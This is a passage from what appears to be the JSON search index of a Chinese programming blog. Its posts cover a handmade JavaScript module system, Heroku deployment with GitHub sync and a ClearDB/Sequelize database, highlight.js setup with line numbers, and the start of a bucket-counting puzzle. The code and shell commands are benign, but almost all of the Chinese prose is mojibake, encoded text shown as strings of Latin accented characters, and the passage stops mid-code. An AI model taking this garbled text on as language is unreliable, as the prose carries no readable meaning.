calculate, name: 'hello'} æ‰€ä»¥æ›å¥è©±èªªï¼Œåªè¦å¯¦ä½œ require('./utils') èƒ½å¤ å›å‚³ module.exports é€™å€‹ç‰©ä»¶å°±å¤§åŠŸå‘Šæˆäº†ã€‚ é–‹å§‹å‹•å·¥é¦–å…ˆæŠŠ main.js çš„å…§å®¹ç”¨ä¸€å€‹ function åŒ…èµ·ä¾†ï¼Œç„¶å¾Œå‚³å…¥ä¸€å€‹ requireï¼ˆä¸€å€‹ functionï¼‰ï¼š 1234567// handmade.jsfunction main(require) { // æ­¤è™•çš„ require æ˜¯ä¸€å€‹ function var obj = require('./utils') console.log(obj.cal(30)) console.log(obj.name)} æ¥è‘—æŠŠ utils.js çš„å…§å®¹ä¹Ÿç”¨ä¸€å€‹ function åŒ…èµ·ä¾†ï¼Œç„¶å¾Œå‚³å…¥ä¸€å€‹ moduleï¼ˆä¸€å€‹ objectï¼‰ï¼š 123456789101112// handmade.jsfunction utilis(module) { function calculate(n) { return ((n * 100 + 20 - 4)) % 10 + 3 } // æ­¤è™•çš„ module æ˜¯ä¸€å€‹ object module.exports = { cal: calculate, name: 'hello' }} è¦ç‰¹åˆ¥æ³¨æ„ä¸€é»ï¼Œutilis() æœƒæŠŠå‚³é€²ä¾†çš„åƒæ•¸ module çµ¦æ–°å¢ä¸€å€‹ exports å±¬æ€§ã€‚ ä¹Ÿå°±æ˜¯èªªåªè¦å‚³ä¸€å€‹ object é€²å»ï¼Œé€™å€‹ object å°±æœƒè¢«æ–°å¢ä¸€å€‹ exports å±¬æ€§ä¾†å„²å­˜æ¨¡çµ„çš„å…§å®¹ã€‚ ï¼ˆå†æ¬¡æé†’ï¼Œå¦‚æœä½ ä¸æ‡‚é€™è£¡çš„é‹ä½œåŸç†ï¼Œè«‹å›å»è¤‡ç¿’ ç†è§£ function å‚³éåƒæ•¸çš„æ©Ÿåˆ¶ï¼‰ é¦¬ä¸Šä¾†è©¦è©¦çœ‹ï¼š 1234567891011121314151617// handmade.jsfunction utilis(module) { function calculate(n) { return ((n * 100 + 20 - 4)) % 10 + 3 } module.exports = { cal: calculate, name: 'hello' }}// ç”¨ä¾†å‚³å…¥ utilis çš„ç©ºç‰©ä»¶var m = {}// åŸ·è¡Œå¾Œ m æœƒè¢«æ–°å¢ä¸€å€‹ exports å±¬æ€§å„²å­˜å…§å®¹utilis(m)// { cal: [Function: calculate], name: 'hello' }console.log(m.exports) åšåˆ°é€™è£¡æˆ‘å€‘å°±å·²ç¶“å®Œæˆå»ºç«‹ module.exports çš„éƒ¨åˆ†äº†ï¼Œæ¥è‘—åªè¦å†è®“ require(./utils) èƒ½å¤ å›å‚³ module.exports çš„å…§å®¹å°±å®Œæˆäº†ï¼š 123456789101112// handmade.jsfunction main(require) { var obj = require('./utils') console.log(obj.cal(30)) console.log(obj.name)}var r = function(m) { // å›å‚³ m.exports ä¸­çš„å…§å®¹ï¼ˆç‰©ä»¶ï¼‰ return m.exports}main(r) é™„ä¸Šå®Œæ•´çš„ç¨‹å¼ç¢¼ï¼š 12345678910111213141516171819202122232425function utilis(module) { function calculate(n) { return ((n * 100 + 20 - 4)) % 10 + 3 } module.exports = { cal: calculate, name: 'hello' }}function main(require) { // './utils' åªæ˜¯ç¤ºæ„ç”¨ï¼Œèˆ‡å¯¦ä½œå…§å®¹ç„¡é—œ var obj = require('./utils') console.log(obj.cal(30)) // 9 console.log(obj.name) // hello}var m = {}utilis(m) // è¼¸å‡ºæ¨¡çµ„var r = function() { return m.exports}main(r) // å¼•å…¥æ¨¡çµ„ ç›´æ¥è¤‡è£½é€™ä¸€æ®µç¨‹å¼ç¢¼å»è·‘ï¼Œä¸ç®¡åœ¨ Node.js æˆ–ç€è¦½å™¨éƒ½å¯ä»¥æ­£å¸¸é‹è¡Œã€‚ åƒè€ƒè³‡æ–™webpack æ–°æ‰‹æ•™å­¸ä¹‹æ·ºè«‡æ¨¡çµ„åŒ–èˆ‡ snowpack","link":"/2021/12/24/handmade-module-system/"},{"title":"è®“ Heroku è·Ÿ Github åŒæ­¥ä¸¦è‡ªå‹•éƒ¨ç½²","text":"éš¨æ‰‹ç´€éŒ„ã€‚ ç°¡è¿°æœ‰ä¸€ä»¶äº‹å¾—å…ˆèªªæ¸…æ¥šï¼Œé€šå¸¸æœƒæœ‰å…©ç¨®æƒ…å¢ƒï¼š æˆ‘å·²ç¶“åœ¨ GitHub æœ‰ Repositoryï¼Œæ¥è‘—æƒ³éƒ¨å±¬ AND åŒæ­¥åˆ° Heroku æˆ‘å·²ç¶“éƒ¨å±¬åˆ° Heroku ä¸Šï¼Œæ¥è‘—æƒ³åœ¨ GitHub ä¸Šé–‹ä¸€å€‹ Repository ä¾†åŒæ­¥ é€™é‚Šè¦è¬›çš„æ˜¯ç¬¬äºŒç¨®ï¼Œå¦‚æœæ˜¯ç¬¬ä¸€ç¨®å¯ä»¥åƒè€ƒ é€™ç¯‡ã€‚ æµç¨‹1. åˆ° GitHub ä¸Šé–‹ä¸€å€‹æ–°çš„ Reopsitory 2. åœ¨æœ¬åœ°ç«¯è¨­å®šä¸€å€‹æ–°çš„ remote æŒ‡å‘ GitHub 1git remote add origin &lt;repository_url&gt; 3. push åˆ° GitHub ä¸Š 1git push origin main 4. åˆ° Heroku ä¸Šè¨­å®š Deploy æˆ‘æ‡¶å¾—é‡å¼„æ‰€ä»¥é€™æ˜¯å®Œæˆå¾Œçš„åœ–ï¼Œä½†ç¸½ä¹‹å®ƒæœƒè¦ä½ å…ˆç™»å…¥ï¼Œå†ä¾†æ˜¯é¸æ“‡ Repositoryï¼Œå°±ç…§è‘—åšå°±å¥½ï¼Œæ‡‰è©²ä¸æœƒæœ‰ä»€éº¼å•é¡Œã€‚ 5. è¨­å®šè‡ªå‹•éƒ¨ç½² ç¬¬å››æ­¥åšå®Œå¾Œå¾€ä¸‹æ»‘ï¼Œå°±æœƒçœ‹åˆ°ã€ŒAutomatic deploysã€çš„é¸é …ï¼š é€™é‚Šå¯ä»¥è¨­å®šåˆ†æ”¯ï¼Œä½†æˆ‘ä¸ç¢ºå®šæ˜¯ä¸æ˜¯çœŸçš„èƒ½æ”¹ï¼Œç¸½ä¹‹æ€•éº»ç…©çš„è©±å»ºè­°ç”¨ main å°±å¥½äº†ã€‚ æœ€å¾ŒæŒ‰ä¸‹ã€ŒEnable Automatic Deploysã€å°±å¯ä»¥äº†ã€‚ é€™æ¨£å°±å®Œæˆå•¦ï¼Œä¹‹å¾Œæ¯ç•¶ GitHub çš„ main åˆ†æ”¯ä¸€æœ‰è®Šå‹• Heroku å°±æœƒè‡ªå‹•å¹«ä½ é‡æ–°éƒ¨ç½²ã€‚","link":"/2022/03/30/heroku-and-github-sync/"},{"title":"Heroko è¨­å®šè³‡æ–™åº« cleardb","text":"ä¸€æ¨£åšå€‹ç­†è¨˜ã€‚ ç°¡è¿°åœ¨ Heroku çš„éƒ¨ç½²æµç¨‹ è£¡å·²ç¶“æ•™éæ€éº¼éƒ¨ç½²ï¼Œä½†è£¡é¢çš„ä¾‹å­åªé©ç”¨æ–¼ã€Œéœæ…‹ç¶²ç«™ã€ã€‚å¦‚æœæƒ³éƒ¨ç½²ã€Œå‹•æ…‹ç¶²ç«™ã€çš„è©±åªçœ‹é€™ç¯‡æ˜¯ä¸å¤ çš„ï¼Œæ‰€ä»¥æ‰æœƒå¯«é€™ç¯‡ä¾†è£œå……ã€‚ é¦–å…ˆè¦çŸ¥é“ä¸€å€‹è§€å¿µï¼ŒHeroku å±¬æ–¼ PaaSï¼ˆä¸çŸ¥é“ Paas æ˜¯ä»€éº¼å¯ä»¥çœ‹é€™ç¯‡ ç†è§£é‚£äº›äº”èŠ±å…«é–€çš„å°ˆæœ‰åè©ï¼šIaaSã€PaaS å’Œ SaaSï¼‰ï¼Œæ‰€ä»¥ä½ æ²’è¾¦æ³•ç›´æ¥åƒåœ¨ç”¨ AWS ä¸€æ¨£å»è£å€‹ MySQL æˆ– Apache ä¾†è·‘ä¹‹é¡çš„ï¼Œå®ƒåªæ˜¯å€‹ã€Œå¹³å°ã€ï¼Œè€Œå¹³å°èƒ½åšçš„äº‹æƒ…æœ‰é™ã€‚ æ‰€ä»¥å‘¢ï¼Œè¦åœ¨ Heroku ä¸Šè·‘ä¸€äº›é¡å¤–åŠŸèƒ½çš„è©±ï¼Œå¾—é€éå®ƒæä¾›çš„ Add-ons æ‰å¯ä»¥ã€‚ é€™é‚Šæˆ‘å€‘æƒ³è¦ç”¨è³‡æ–™åº«çš„åŠŸèƒ½ï¼Œæ‰€ä»¥æœƒç”¨ä¸€å€‹å«åš cleardb çš„æ’ä»¶ä¾†ç•¶åšç¯„ä¾‹ã€‚ è©³ç´°çš„ä»‹ç´¹å¯ä»¥åƒè€ƒå®˜æ–¹æ–‡ä»¶ï¼Œé€™é‚Šåªæœƒç°¡å–®å¸¶ä¸€ä¸‹æµç¨‹ã€‚ å®‰è£è¨˜å¾—æ˜¯åœ¨ä½ çš„ Heroku app å°ˆæ¡ˆåº•ä¸‹å®‰è£ã€‚ é™„è¨»ï¼šé€™é‚Šè£çš„æ˜¯ ignite å…è²»ç‰ˆï¼Œåªèƒ½å­˜ 5MB 1heroku addons:create cleardb:ignite é †é“ä¸€æï¼Œå¦‚æœä½ çš„å¸³è™Ÿæ²’åšé©—è­‰çš„è©±å¯èƒ½æœƒè·³å‡ºä¸€æ®µè¨Šæ¯è¦ä½ è¨­å®šä¿¡ç”¨å¡ã€‚å› ç‚ºæˆ‘æ‡¶è·‘çš„é©—è­‰æµç¨‹æ‰€ä»¥å°±ç›´æ¥å¡«äº†ï¼Œä½†ä¸ç”¨æ“”å¿ƒï¼Œé€™å€‹ä¸æœƒæ”¶è²»ï¼Œç´”ç²¹åªæ˜¯åšå€‹é©—è­‰è€Œå·²ã€‚ è¨­å®š Sequelize é€£ç·šåˆ°è³‡æ–™åº«çš„è¨­å®šï¼ˆé€™é‚Šæ˜¯ç”¨ Sequelize é€™å¥— ORM ä¾†ç®¡ç†è³‡æ–™åº«ï¼Œæ‰€ä»¥å°±ä»¥ Sequelize ç‚ºä¸»ï¼‰ å‰é¢å®‰è£å¥½å¾Œï¼Œåˆ°ä½ çš„ Heroku è£¡é¢æ‡‰è©²å°±èƒ½çœ‹åˆ°ç’°å¢ƒè®Šæ•¸è£¡é¢å¤šäº†è³‡æ–™åº«çš„æ±è¥¿ï¼š æ ¼å¼å¤§æ¦‚æ˜¯é•·é€™æ¨£ï¼šmysql://&lt;username&gt;:&lt;password&gt;@&lt;host&gt;/&lt;db_name&gt;?reconnect=true é€éç’°å¢ƒè®Šæ•¸æ˜¯å› ç‚ºæˆ‘å€‘ä¸æƒ³è¦æŠŠé€™äº›æ•æ„Ÿè³‡è¨ŠåŠ åˆ° git è£¡é¢ï¼Œæ‰€ä»¥æ‰æœƒé€éé€™ç¨®æ–¹å¼ã€‚ æ¥è‘—æ˜¯ Sequelize çš„éƒ¨åˆ†ï¼Œé¦–å…ˆä¾†çœ‹ä¸€ä¸‹ /models/index.js çš„æª”æ¡ˆå…§å®¹ï¼š 12345678910111213141516171819'use strict';const fs = require('fs');const path = require('path');const Sequelize = require('sequelize');const basename = path.basename(__filename);// æª¢æŸ¥ç’°å¢ƒè®Šæ•¸ï¼Œæœ‰å€¼çš„è©±å°±å¥—ç”¨è¨­å®šå€¼ï¼ˆæ‡‰è©²å•¦ï¼‰const env = process.env.NODE_ENV || 'development';// åˆ¤æ–·è¦ç”¨ config.json ä¸­çš„å“ªç¨®ç‰ˆæœ¬ï¼ˆdevelopment | test | productionï¼‰const config = require(__dirname + '/../config/config.json')[env];const db = {};let sequelize;// æ ¹æ“š config è£¡é¢æœ‰æ²’æœ‰ use_env_variable å±¬æ€§åŸ·è¡Œä¸åŒçš„ Sequelizeif (config.use_env_variable) { sequelize = new Sequelize(process.env[config.use_env_variable], config);} else { sequelize = new Sequelize(config.database, config.username, config.password, config);} ç¸½ä¹‹å‘¢ï¼Œç¯€éŒ„é€™æ®µæ˜¯æƒ³è¬›å…©å€‹é‡é»ï¼š æˆ‘å€‘æƒ³ç”¨ production çš„ config æˆ‘å€‘æƒ³é€é use_env_variable ä¾†è¨­å®šé€£ç·šåˆ°è³‡æ–™åº«çš„å€¼ æ‰€ä»¥æ¥è‘—åˆ° config.json ä¾†åšä¸€äº›èª¿æ•´ï¼š 123456789101112131415161718192021222324252627// config.json{ \"development\": { \"username\": \"root\", \"password\": \"root\", \"database\": \"express\", \"host\": \"localhost\", \"dialect\": \"mariadb\" }, \"test\": { \"username\": \"root\", \"password\": null, \"database\": \"database_test\", \"host\": \"127.0.0.1\", \"dialect\": \"mysql\" }, // æƒ³ç”¨é€™ä¸€æ®µçš„ config \"production\": { \"username\": \"root\", \"password\": null, \"database\": \"database_production\", \"host\": \"127.0.0.1\", \"dialect\": \"mysql\", // æˆ‘å€‘ä¸è¦ç›´æ¥å¯«åœ¨ä¸Šé¢ï¼Œè€Œæ˜¯é€éç’°å¢ƒè®Šæ•¸ä¾†å¸¶å…¥ \"use_env_variable\": \"CLEARDB_DATABASE_URL\" }} åˆ°ç›®å‰ç‚ºæ­¢ï¼Œé€£ç·šçš„éƒ¨åˆ†å°±å®Œæˆäº†ã€‚ æ¥ä¸‹ä¾†ç›´æ¥éƒ¨ç½²çš„è©±é‚„æ˜¯æ²’è¾¦æ³•è·‘çš„ï¼Œå› ç‚ºæˆ‘å€‘ç”¨ Sequelize å»ºç«‹è³‡æ–™åº«æ™‚è¦å¾—åŸ·è¡Œ npx sequelize db:migrateï¼Œé€™ä¸€æ­¥æ‰ç®—çœŸçš„å»ºç«‹ tableï¼Œæ‰€ä»¥å¾—å†åŠ ä¸€æ®µ script æ‰è¡Œï¼š 12345678// package.json\"scripts\": { \"test\": \"jest\", // æ–°å¢ sequelize æŒ‡ä»¤ \"db:migrate\": \"npx sequelize db:migrate\", // åŸ·è¡Œé †åºè¦å°ï¼Œå…ˆ migrate æ‰åŸ·è¡Œ node \"start\": \"npm run db:migrate &amp;&amp; node index.js\"} åˆ°é€™ä¸€æ­¥å°±çœŸçš„å®Œæˆäº†ï¼Œå¯ä»¥ push åˆ° Heroku ä¸Šçœ‹çœ‹å›‰ï¼ å¦‚æœé‚„æ˜¯ä¸è¡Œçš„è©±å°±è€æ¨£å­ï¼ŒåŸ·è¡Œ heroku logs ä¾† debug å›‰ã€‚ æˆåŠŸæ˜¯æˆåŠŸäº†ï¼Œä½†æˆ‘è¦æ€éº¼çœ‹è³‡æ–™åº«è£¡çš„è³‡æ–™ï¼Ÿé¦–å…ˆå®˜æ–¹æœ‰å‘Šè¨´ä½ é€™ä¸€æ®µï¼š ç°¡å–®ä¾†èªªå°±æ˜¯å»ºè­°ä½ ç”¨ç®¡ç†è³‡æ–™åº«çš„ GUI è»Ÿé«”ä¾†çœ‹ã€‚æˆ‘å®¶æ˜¯ Windows æ‰€ä»¥å°±ç”¨ MySQL Workbench, ä¾†åšã€‚ æ¥ä¸‹ä¾†çš„æ­¥é©Ÿä¹Ÿå¾ˆç°¡å–®ï¼Œå°±æ˜¯é€éå‰é¢ cleardb æä¾›çµ¦ä½ çš„ç’°å¢ƒè®Šæ•¸å€¼ä¾†è¨­å®šé€£ç·šå°± OK äº†ï¼š é€™é‚Šè¦å¡«çš„å€¼ï¼š Connection Nameï¼šåªæ˜¯åç¨±è€Œå·²ï¼Œçœ‹ä½ æƒ³å¡«ä»€éº¼ HostNameï¼šä¸»æ©Ÿåç¨± Usernameï¼šä½¿ç”¨è€…åç¨± Passwordï¼šå¯†ç¢¼ Default Schemaï¼šDB åç¨± å¦‚æœå‰é¢å¿˜è¨˜æ ¼å¼çš„è©±å†å¹«ä½ è¤‡ç¿’ä¸€æ¬¡ï¼Œæ ¼å¼æ˜¯é•·é€™æ¨£ï¼š mysql://&lt;username&gt;:&lt;password&gt;@&lt;host&gt;/&lt;db_name&gt;?reconnect=true æŠŠå°æ‡‰çš„å€¼å¡«é€²å»å°±å¥½äº†ï¼ŒæˆåŠŸçš„è©±å°±èƒ½çœ‹åˆ°è³‡æ–™åº«ä¸­çš„å…§å®¹äº†ã€‚","link":"/2022/03/28/heroku-cleardb/"},{"title":"Heroku çš„éƒ¨ç½²æµç¨‹","text":"ç°¡å–®åšå€‹ç­†è¨˜ã€‚ æ‡¶äººåŒ…è©³ç´°å¯ä»¥åƒè€ƒé€™å¹¾å€‹å®˜æ–¹æ–‡ä»¶ï¼š https://devcenter.heroku.com/articles/deploying-nodejs Node.js çš„éƒ¨ç½²æ–¹å¼ https://devcenter.heroku.com/articles/cleardb cleardb çš„ç›¸é—œæ–‡ä»¶ https://devcenter.heroku.com/articles/procfile Procfile çš„è¨­å®šæ–¹å¼ æ¥è‘—æ˜¯ä¸€äº› Heroku çš„å°çŸ¥è­˜ï¼š é è¨­åªæœ‰ master å’Œ main åˆ†æ”¯æœƒè‡ªå‹•éƒ¨ç½²ï¼ˆæ‡‰è©²ï¼‰ å¯ä»¥åœ¨ Heroku ä¸Šè¨­ç½®ç’°å¢ƒè®Šæ•¸ï¼Œå†è®“ Node.js å–å¾— ã€ŒDynoã€ æ˜¯ Heroku ç”¨ä¾†è¡¨ç¤ºä¸€å€‹ APP çš„ç”¨èª æœ‰è‡ªå‹•ä¼‘çœ æ©Ÿåˆ¶ï¼Œä¸€æ®µæ™‚é–“æ²’å­˜å– APP çš„è©±å°±æœƒå…ˆé—œèµ·ä¾†ï¼Œé€™æ¨£å¯ä»¥åœæ­¢è¨ˆç®—æ™‚æ•¸ã€‚ å¤§è‡´æµç¨‹ å°å°ˆæ¡ˆå»ºç«‹ git ç‰ˆæ§ å»ºç«‹ä¸€å€‹ Heroku app push åˆ° Heroku çš„é ç«¯ repository å…¶ä»–æ³¨æ„äº‹é … è¨­å®šç’°å¢ƒè®Šæ•¸ï¼šport æˆ– db ç›¸é—œåƒæ•¸è¨­å®š è¨­å®š npm run start çš„æŒ‡ä»¤ï¼ˆHeroku é è¨­è·‘é€™å€‹ï¼Œä¸ç„¶å°±è¦å¦å¤–å¯« Profileï¼‰ åœ¨ package.json è¨­å®š enginesï¼ˆNode.js ç‰ˆæœ¬ï¼‰ å¯¦éš›èµ°ä¸€éæµç¨‹ç­‰ä¸€ä¸‹æˆ‘å¯«ä»€éº¼ä½ åšä»€éº¼ï¼Œè·Ÿè‘—åšå°±å°äº†ã€‚ å»ºç«‹å°ˆæ¡ˆ1mkdir myapp åˆå§‹åŒ– NPM1npm init -y å¯«å°ˆæ¡ˆå…§å®¹é€™é‚Šå¯«ä¸€å€‹ç°¡å–®çš„ç¯„ä¾‹ï¼Œåªæœƒé¡¯ç¤º Hello + åç¨±ï¼š 123456789101112131415// index.jsconst express = require('express');const app = express();// é‡é»æ˜¯é€™é‚Šï¼Œè¨˜å¾—è¨­å®šç’°å¢ƒè®Šæ•¸ PORT// å…¶å®ƒå°±çœ‹ä½ çš„ APP éœ€æ±‚ä¾†å¯«const port = process.env.PORT || 3000;const name = process.env.NAME || 'empty';app.get('/', (req, res) =&gt; { res.end('Hello, ' + name);});app.listen(port, () =&gt; { console.log(`App is running on port ${port}`);}); è¨­å®š package.jsoné€™é‚Šè¦åšå…©ä»¶äº‹ï¼š è¨­å®š npm run start æŒ‡ä»¤ï¼ˆå‘Šè¨´å®ƒé€™å€‹æŒ‡ä»¤è¦è·‘ä»€éº¼ï¼‰ è¨­å®š enginesï¼ˆå‘Šè¨´å®ƒè¦ç”¨å“ªå€‹ Node.js ç‰ˆæœ¬ä¾†è·‘ï¼‰ 12345678910111213141516{ \"name\": \"newapp\", \"version\": \"1.0.0\", \"description\": \"\", \"main\": \"index.js\", \"scripts\": { \"test\": \"echo \\\"Error: no test specified\\\" &amp;&amp; exit 1\", \"start\": \"node index.js\" }, \"engines\": { \"node\": \"14.x\" }, \"keywords\": [], \"author\": \"\", \"license\": \"ISC\"} å»ºç«‹ git ç‰ˆæ§è¨˜å¾—è¨­å®š .gitignore æŠŠä¸å¿…è¦çš„æ±è¥¿æ‹¿æ‰ã€‚ 12git add . git commit -m 'init' å»ºç«‹ Heroku çš„é ç«¯ repositoryheroku create &lt;appåç¨±&gt; app åç¨±å¯å¡«å¯ä¸å¡«ï¼Œæ²’å¡«çš„è©±æœƒè‡ªå‹•ç”¢ç”Ÿã€‚ 1heroku create my-awesome-peanu-app çœ‹åˆ°é€™å€‹å°±ä»£è¡¨å»ºç«‹æˆåŠŸï¼š 12# app ç¶²å€ | remote repositoryhttps://my-awesome-peanu-app.herokuapp.com/ | https://git.heroku.com/my-awesome-peanu-app.git é€™é‚Šå¯ä»¥ç”¨ git remote -v ä¾†åšç¢ºèªï¼š 123git remote -vheroku https://git.heroku.com/my-awesome-peanu-app.git (fetch)heroku https://git.heroku.com/my-awesome-peanu-app.git (push) æŠŠå°ˆæ¡ˆ push ä¸Šå»1git push heroku master åŸºæœ¬ä¸Šæ²’å‡ºç¾ Error log çš„è©±å°±ä»£è¡¨éƒ¨ç½²æˆåŠŸã€‚æ¥è‘—å°±å¯ä»¥æ‰“é–‹ä¾†çœ‹äº†ï¼š 1heroku open é€™æ¨£å°±éƒ¨ç½²å®Œæˆå›‰ï¼Œæ­å–œæ­å–œï¼š é™„è¨»é—œæ–¼ debugå¦‚æœæœ€å¾Œæ‰“é–‹ç¶²ç«™å¾Œç™¼ç¾ç•°å¸¸ï¼Œé‚£å°±åªèƒ½é ä½ è‡ªå·±äº†ï¼Œè«‹åŸ·è¡Œé€™å€‹æŒ‡ä»¤ï¼š 1heroku logs ç›´æ¥çœ‹ log å¯«äº†ä»€éº¼ç„¶å¾Œå» debug å§ï¼Œé€šå¸¸éƒ½æœƒå¯«å¾—è »æ¸…æ¥šçš„ï¼ŒåŠ æ²¹å›‰ï¼ ä¿®æ”¹ App åç¨±å¯ä»¥åˆ° Settings é é¢ï¼š ç›´æ¥æ”¹å®Œ Save å°±å¯ä»¥äº†ï¼Œä¸éè¦æ³¨æ„æ”¹å®Œå¾Œå¾—é‡æ–°è¨­å®š remote çš„ repositoryï¼š 12git remote rm herokuheroku git:remote -a newname","link":"/2022/03/28/heroku-deploy/"},{"title":"highlight.js çš„ä½¿ç”¨æ–¹æ³•","text":"å¯«èµ·ä¾†ä¸æ€•ä»¥å¾Œå¿˜è¨˜ã€‚ å¼•å…¥æ–¹å¼highlight.js ä¸»è¦å°±å…©éš»æª”æ¡ˆï¼š æ¯å€‹ä¸»é¡Œçš„ CSS æª”æ¡ˆ æ¸²æŸ“ç¨‹å¼ç¢¼å€å¡Šçš„ JavaScript æª”æ¡ˆ é€™é‚Šæˆ‘åªåˆ—å¹¾å€‹æ¯”è¼ƒæ–¹ä¾¿çš„ï¼Œè©³ç´°è«‹ç›´æ¥åƒè€ƒé€™è£¡ã€‚ CDN å¼•å…¥ 12&lt;link rel=\"stylesheet\" href=\"//cdnjs.cloudflare.com/ajax/libs/highlight.js/11.4.0/styles/default.min.css\"&gt;&lt;script src=\"//cdnjs.cloudflare.com/ajax/libs/highlight.js/11.4.0/highlight.min.js\"&gt;&lt;/script&gt; åƒ default.min.css å¯ä»¥æ›æˆè‡ªå·±å–œæ­¡çš„ä¸»é¡Œï¼Œä¾‹å¦‚ï¼šagate.min.css å¦‚æœä¸çŸ¥é“æœ‰äº›ä¸»é¡Œçš„æª”åæ˜¯ä»€éº¼ï¼Œå»ºè­°ç›´æ¥ä¸‹è¼‰æª”æ¡ˆä¾†çœ‹å°±çŸ¥é“äº†ï¼ˆåƒ A 11 Y DARK çš„æª”åæ˜¯ a11y-dark.min.cssï¼‰ã€‚ æŠŠæª”æ¡ˆä¸‹è¼‰åˆ°é›»è…¦ï¼Œå†æŒ‡å®šæª”æ¡ˆè·¯å¾‘ å…ˆåˆ°é€™è£¡ä¸‹è¼‰æª”æ¡ˆï¼Œæ»‘åˆ°ä¸‹é¢é¸æ“‡è¦æ”¯æ´çš„èªè¨€ï¼Œå†æŒ‰ Dowload å°±å¥½å›‰ã€‚ 1234&lt;!-- css (tomorrow-night-bright) --&gt;&lt;link rel=\"stylesheet\" href=\"./plug-in/highlight_js/tomorrow-night-bright.min.css\"&gt;&lt;!-- js --&gt;&lt;script src=\"./plug-in/highlight_js/highlight.min.js\"&gt;&lt;/script&gt; é€™æ¨£å¼•å…¥çš„éƒ¨åˆ†å°±å®Œæˆäº†ã€‚ å•Ÿå‹•æ–¹å¼highlight.js çš„åŸç†æ˜¯åœ¨ DOM è¼‰å…¥æ™‚è‡ªå‹•å»æŠ“ pre è·Ÿ code çš„éƒ¨åˆ†ä¾†æ¸²æŸ“ç¨‹å¼ç¢¼å€å¡Šï¼Œæ‰€ä»¥å‡è¨­æœ‰æ®µ HTML å¦‚ä¸‹ï¼š 123&lt;pre&gt; &lt;code class=\"language-javascript\"&gt;console.log('yo')&lt;/code&gt;&lt;/pre&gt; ï¼ˆå®ƒæ˜¯ç”¨ class ä¾†åˆ¤æ–·èªè¨€çš„ï¼Œé›–ç„¶èªªæœ‰è‡ªå‹•åµæ¸¬çš„åŠŸèƒ½ï¼Œä½†é‚„æ˜¯å»ºè­°åŠ ä¸€ä¸‹æ¯”è¼ƒå¥½ã€‚ï¼‰ æ¥è‘—è¨˜å¾—åŠ ä¸Šä¸‹é¢çš„ code ä¾†å•Ÿç”¨ highlight.jsï¼š 123&lt;script&gt; hljs.highlightAll();&lt;/script&gt; é€™æ¨£å°±æœƒçœ‹åˆ°æ°´å™¹å™¹çš„ code å›‰ï¼š è£œå……ï¼åŠ ä¸Šç¨‹å¼ç¢¼è¡Œæ•¸highlight.js æœ¬èº«æ˜¯æ²’æœ‰è¡Œæ•¸åŠŸèƒ½çš„ï¼Œæ‰€ä»¥è¦åˆ°é€™è£¡ä¸‹è¼‰å¦ä¸€å€‹å¥—ä»¶ã€‚ æ–‡ä»¶è£¡æœ‰è©³ç´°å¯«è¦æ€éº¼å®‰è£è·Ÿä½¿ç”¨ï¼Œé€™é‚Šåªç¤ºç¯„æˆ‘çš„ä½œæ³•ï¼š å¼•å…¥æª”æ¡ˆ 123&lt;script src=\"path/to/highlight.min.js\"&gt;&lt;/script&gt;&lt;!-- å®ƒä¾è³´ highlight.jsï¼Œæ‰€ä»¥è¦è¨˜å¾—æ”¾åœ¨å¾Œé¢ --&gt;&lt;script src=\"path/to/highlightjs-line-numbers.min.js\"&gt;&lt;/script&gt; å•Ÿå‹•æ–¹å¼ 1234&lt;script&gt; hljs.highlightAll(); hljs.initLineNumbersOnLoad();&lt;/script&gt; æ¥è‘—å°±æœƒé¡¯ç¤ºè¡Œæ•¸äº†ï¼š ä¸éé¡¯è€Œæ˜“è¦‹ï¼Œé€™å¥—ä»¶ä¼¼ä¹æ²’é è¨­æ¨£å¼ï¼Œæ‰€ä»¥æˆ‘åŠ äº†ä¸€æ®µ CSS ä¾†å„ªåŒ–ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243/* é€™æ®µæ˜¯æ”¹ highlight.js çš„ CSS æ¨£å¼ï¼Œ æ‰€ä»¥è¦è¨˜å¾—æ”¾åœ¨å¾Œé¢æ‰ä¸æœƒè¢«è¦†å¯«ã€‚*/pre code.hljs { padding: 0;}/* æ•¸å­—å€å¡Šçš„æ¨£å¼ */.hljs-ln-numbers { -webkit-touch-callout: none; -webkit-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; text-align: center; color: #EAEAEA; vertical-align: top; padding-top: 0.1em !important; padding-bottom: 0.1em !important; padding-left: 1em !important; padding-right: 1em !important; background-color: rgb(255 255 255 / 15%);}/* ç¨‹å¼å€å¡Šçš„æ¨£å¼ */.hljs-ln-code { padding-left: 0.8em !important;}/* ä¸‹é¢æ˜¯ä¸€äº›å°é½Šçš„è™•ç† */.hljs-ln tr:first-child .hljs-ln-numbers { padding-top: 0.8em !important;}.hljs-ln tr:last-child .hljs-ln-numbers { padding-bottom: 0.8em !important;}.hljs-ln tr:first-child .hljs-ln-code { vertical-align: bottom;}.hljs-ln tr:last-child .hljs-ln-code { vertical-align: top;}.hljs-ln tr:only-child .hljs-ln-code{ vertical-align: middle;} é€™æ¨£å°±å¥½çœ‹å¤šäº†ã€‚ è£œå……ä¸€äº› Options åªæœ‰ä¸€è¡Œæ™‚è¦ä¸è¦é¡¯ç¤ºè¡Œæ•¸ 123hljs.initLineNumbersOnLoad({ singleLine: true}); è¨­å®šç¬¬ä¸€è¡Œçš„èµ·å§‹æ•¸å­— 123hljs.lineNumbersBlock(myCodeBlock, { startFrom: 10});","link":"/2022/02/20/highlight-js-usage/"},{"title":"å¹¾å€‹æ°´æ¡¶ï¼Ÿ","text":"é€™æ˜¯ä¾†è‡ª LIOJ ä¸Šçš„é¡Œç›®ï¼Œå› ç‚ºè§£æ³•å¾ˆæœ‰è¶£ï¼Œæ‰€ä»¥æƒ³è¨˜éŒ„ä¸‹ä¾†ã€‚ æœ€åŸå§‹çš„è§£æ³•é€™å€‹æ–¹æ³•æœ€ç›´è¦ºï¼Œä¹Ÿæ˜¯æˆ‘æœ€ä¸€é–‹å§‹çš„è§£æ³•ï¼š n = æ°´é‡ count = æ°´æ¡¶æ•¸é‡ éæ­· 2^0 åˆ° 2^31 æ¯ç•¶æ‰¾åˆ°æ¯” n å¤§çš„æ•¸å­—ï¼Œæ›´æ–° n çš„å€¼ï¼Œcount + 1 é‡è¤‡ 3-4ï¼Œç›´åˆ° n ç‚º 0 12345678910111213141516171819202122232425262728293031323334function solve(lines) { // æ‰€éœ€æ°´é‡ let capacity = Number(lines[0]) // è¨ˆæ•¸å™¨ let count = 0 // åªè¦ capacity &gt; 0ï¼Œå°±æœƒä¸€ç›´åŸ·è¡Œ while (capacity) { // æ‰¾å‡ºæœ€å¤§çš„æ°´æ¡¶ let max = 